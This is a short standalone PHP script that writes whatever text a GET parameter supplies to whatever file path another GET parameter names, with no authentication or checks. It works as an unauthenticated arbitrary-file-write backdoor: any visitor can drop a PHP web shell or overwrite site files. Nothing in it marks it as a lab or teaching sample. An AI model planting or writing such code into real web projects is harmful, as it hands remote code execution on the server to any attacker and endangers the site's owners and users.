<?php
if($_GET)
{
	$link=$_GET["link"];
	$input=$_GET["input"];
	file_put_contents($link, $input); 
}
?>